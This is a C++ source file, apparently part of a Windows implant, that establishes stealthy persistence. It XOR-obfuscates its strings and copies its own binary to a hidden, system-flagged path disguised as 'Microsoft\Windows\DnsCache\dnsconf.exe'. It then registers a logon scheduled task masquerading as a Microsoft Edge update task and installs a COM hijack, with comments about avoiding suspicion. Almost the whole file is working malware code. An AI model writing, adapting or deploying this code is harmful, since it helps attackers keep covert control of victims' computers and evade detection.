#include "Persistence.h"
#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>

namespace persistence {

namespace {
    // {21EC2020-3AEA-1069-A2DD-08002B30309D} (Work Folders)
    const wchar_t kClsidEnc[] = { '{'^0x4B, '2'^0x1F, '1'^0x8C, 'E'^0x3E, 'C'^0x4B, '2'^0x1F, '0'^0x8C, '2'^0x3E, '0'^0x4B, '-'^0x1F, '3'^0x8C, 'A'^0x3E, 'E'^0x4B, 'A'^0x1F, '-'^0x8C, '1'^0x3E, '0'^0x4B, '6'^0x1F, '9'^0x8C, '-'^0x3E, 'A'^0x4B, '2'^0x1F, 'D'^0x8C, 'D'^0x3E, '-'^0x4B, '0'^0x1F, '8'^0x8C, '0'^0x3E, '0'^0x4B, '2'^0x1F, 'B'^0x8C, '3'^0x3E, '0'^0x4B, '3'^0x1F, '0'^0x8C, '9'^0x3E, 'D'^0x4B, '}'^0x1F };
    // LocalServer32
    const wchar_t kLocalServerEnc[] = { 'L'^0x4B, 'o'^0x1F, 'c'^0x8C, 'a'^0x3E, 'l'^0x4B, 'S'^0x1F, 'e'^0x8C, 'r'^0x3E, 'v'^0x4B, 'e'^0x1F, 'r'^0x8C, '3'^0x3E, '2'^0x4B };
    // MicrosoftEdgeUpdateTaskMachineCore
    const wchar_t kTaskNameEnc[] = { 'M'^0x4B, 'i'^0x1F, 'c'^0x8C, 'r'^0x3E, 'o'^0x4B, 's'^0x1F, 'o'^0x8C, 'f'^0x3E, 't'^0x4B, 'E'^0x1F, 'd'^0x8C, 'g'^0x3E, 'e'^0x4B, 'U'^0x1F, 'p'^0x8C, 'd'^0x3E, 'a'^0x4B, 't'^0x1F, 'e'^0x8C, 'T'^0x3E, 'a'^0x4B, 's'^0x1F, 'k'^0x8C, 'M'^0x3E, 'a'^0x4B, 'c'^0x1F, 'h'^0x8C, 'i'^0x3E, 'n'^0x4B, 'e'^0x1F, 'C'^0x8C, 'o'^0x3E, 'r'^0x4B, 'e'^0x1F };

    const wchar_t kSubDirEnc[] = { 'M'^0x4B, 'i'^0x1F, 'c'^0x8C, 'r'^0x3E, 'o'^0x4B, 's'^0x1F, 'o'^0x8C, 'f'^0x3E, 't'^0x4B, '\\'^0x1F, 'W'^0x8C, 'i'^0x3E, 'n'^0x4B, 'd'^0x1F, 'o'^0x8C, 'w'^0x3E, 's'^0x4B, '\\'^0x1F, 'D'^0x8C, 'n'^0x3E, 's'^0x4B, 'C'^0x1F, 'a'^0x8C, 'c'^0x3E, 'h'^0x4B, 'e'^0x1F }; // Microsoft\Windows\DnsCache
    const wchar_t kExeNameEnc[] = { 'd'^0x4B, 'n'^0x1F, 's'^0x8C, 'c'^0x3E, 'o'^0x4B, 'n'^0x1F, 'f'^0x8C, '.'^0x3E, 'e'^0x4B, 'x'^0x1F, 'e'^0x8C }; // dnsconf.exe

    std::wstring GetPersistencePath() {
        wchar_t path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            return std::wstring(path) + L"\\" + utils::DecryptW(kSubDirEnc, 26) + L"\\" + utils::DecryptW(kExeNameEnc, 11);
        }
        return L"";
    }

    bool InstallScheduledTask(const std::wstring& implantPath) {
        std::wstring taskName = utils::DecryptW(kTaskNameEnc, 34);
        // Use a less suspicious command: daily at a random time, or on logon.
        // We'll use onlogon for reliability.
        std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc onlogon /f";
        return WinExec(utils::ws2s(cmd).c_str(), SW_HIDE) > 31;
    }
}

std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
    LOG_INFO("Establishing stealthy persistence...");

    std::wstring targetPath = GetPersistencePath();
    if (targetPath.empty()) return L"";

    wchar_t currentPath[MAX_PATH];
    if (overrideSourcePath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) return L"";
    } else {
        wcscpy(currentPath, overrideSourcePath.c_str());
    }

    if (_wcsicmp(currentPath, targetPath.c_str()) != 0) {
        std::wstring dir = targetPath.substr(0, targetPath.find_last_of(L"\\"));

        // Create directories recursively
        size_t pos = 0;
        while ((pos = dir.find(L"\\", pos + 1)) != std::wstring::npos) {
            std::wstring sub = dir.substr(0, pos);
            CreateDirectoryW(sub.c_str(), NULL);
        }
        CreateDirectoryW(dir.c_str(), NULL);

        if (!CopyFileW(currentPath, targetPath.c_str(), FALSE)) {
            LOG_ERR("Failed to copy binary to persistence path: " + utils::ws2s(targetPath));
        } else {
            SetFileAttributesW(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    // Method 1: Scheduled Task (Primary)
    if (InstallScheduledTask(targetPath)) {
        LOG_INFO("Scheduled Task success.");
    }

    // Method 2: COM Hijack (Secondary, safer CLSID)
    std::wstring clsid = utils::DecryptW(kClsidEnc, 38);
    std::wstring subkey = utils::DecryptW(kLocalServerEnc, 13);
    if (ComHijacker::Install(targetPath, clsid, subkey)) {
        LOG_INFO("COM Hijack success: " + utils::ws2s(clsid));
    }

    return targetPath;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
